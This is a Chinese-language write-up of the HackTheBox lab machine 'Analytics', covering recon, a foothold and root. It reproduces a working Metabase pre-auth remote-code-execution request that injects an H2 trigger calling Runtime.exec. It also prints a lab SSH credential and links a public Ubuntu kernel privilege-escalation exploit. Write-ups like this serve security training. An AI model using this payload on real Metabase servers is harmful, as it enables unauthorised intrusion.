---
title: Analytics-HTB靶机
published: 2024-04-21
description: 'HackThebox-Easy难度靶机，现有poc，从信息收集至root权限全过程'
image: '{21F7B525-A074-4864-BDF8-B43E9D151E15}.png'
tags: ['HTB','Linux','Easy']
category: '靶机'
draft: false 
lang: ''
---
* 因原服务器到期，该文章从原服务器迁移至此，图片可能模糊，见谅
# 打点
拿到靶机地址，namp扫描开放端口，发现开放22，80端口
![](https://impos1.oss-cn-beijing.aliyuncs.com/20250827141509.png)
直接访问80端口自动跳转至analytical.htb，将域名加入hosts文件，之后访问域名。

大题浏览功能点，发现导航栏login链接data.analytical.htb,将其加入hosts文件。
![](https://impos1.oss-cn-beijing.aliyuncs.com/%7BF3A1E189-55C2-4010-AE02-E2EA47C643BF%7D.png)
访问data.analytical.htb，发现一个登录页，因为题目难度为easy，因此考虑是否是存在近期公开漏洞可直接getshell。
![](https://impos1.oss-cn-beijing.aliyuncs.com/%7BD604808B-FE78-489F-AA3C-AAECF04FAB84%7D.png)
阿里漏洞库检索，发现果然存在rce漏洞，并且存在公开poc。
![](https://impos1.oss-cn-beijing.aliyuncs.com/%7B5E6761B9-463A-4B39-BF31-6D3B18A4A3A1%7D.png)
网上检索POC，发现文章https://blog.csdn.net/qq_41904294/article/details/131990310。

首先获取set-token
``` http
GET /api/session/properties HTTP/1.1
Host: your-ip
``` 
![](https://impos1.oss-cn-beijing.aliyuncs.com/%7BBB202E5D-9382-4AC0-A8B3-7476C9D8FA6E%7D.png)
其次直接RCE
``` 
POST /api/setup/validate HTTP/1.1
Host: your-ip
Content-Type: application/json
 
{
    "token": "token值",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('执行的命令')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "test",
        "engine": "h2"
    }
}
``` 
![](https://impos1.oss-cn-beijing.aliyuncs.com/%7BDCA5FA51-22C2-4B39-A84C-F8FE03F8112A%7D.png)
拿到立足点
![](https://impos1.oss-cn-beijing.aliyuncs.com/20250827141757.png)
# 提权
## 信息收集
拿到立足点后直接搜索user.txt文件，无果，因此进一步信息收集。

为了方便，通过脚本linpeas进行信息收集，工具地址https://github.com/carlospolop/PEASS-ng

kali用python开一个http服务，靶机拿wget下载linpeas，脚本结果中发现env变量存在账户和口令，并且该靶机运行在docker容器下。顺便看一下靶机内网ip和arp表，发现靶机为172.17.0.2，arp表中存在172.17.0.1的机器，推测user.txt在172.16.0.1这个地址。
![](https://impos1.oss-cn-beijing.aliyuncs.com/%7BC677E0A3-F82D-41CF-A440-1A0DF3FBEABA%7D.png)
![](https://impos1.oss-cn-beijing.aliyuncs.com/%7B6E60D517-8379-4057-BA42-C4E1C1622127%7D.png)
![](https://impos1.oss-cn-beijing.aliyuncs.com/%7BC46861B6-BBF9-411C-A353-A093BA7FCFE3%7D.png)
账户密码是首先关注的，拿到两个账户metabase、metalytics，一个密码An4lytics_ds20223#

联想之前端口扫描结果，机器开启了ssh服务，尝试登录。

最终通过metalytics/An4lytics_ds20223#成功登录靶机。
![](https://impos1.oss-cn-beijing.aliyuncs.com/%7B71D6C7A0-20A7-4104-903F-9F26F1F082B7%7D.png)
该内网ip为172.17.0.1，拿到第一个flag
![](https://impos1.oss-cn-beijing.aliyuncs.com/20250827141932.png)
## Root
ssh登录后的banner信息提示系统为ubantu22.04.3，uname -a确认一下
![](https://impos1.oss-cn-beijing.aliyuncs.com/20250827142008.png)
先检索是否存在内核提权漏洞，google检索”ubuntu 22.04 提权“，发现存在提权漏洞。

![](https://impos1.oss-cn-beijing.aliyuncs.com/%7B1EE9B738-DFEB-4416-A603-4A8F7021B954%7D.png)
拿CVE编号去github找exp，

发现https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh

直接拿exp开打，拿下root权限。
![](https://impos1.oss-cn-beijing.aliyuncs.com/20250827142048.png)
# 总结
靶机总体难度不高，感觉主要考察细心和漏洞检索能力，漏洞细节网上均已公开，直接拿现成poc即可拿下本台靶机。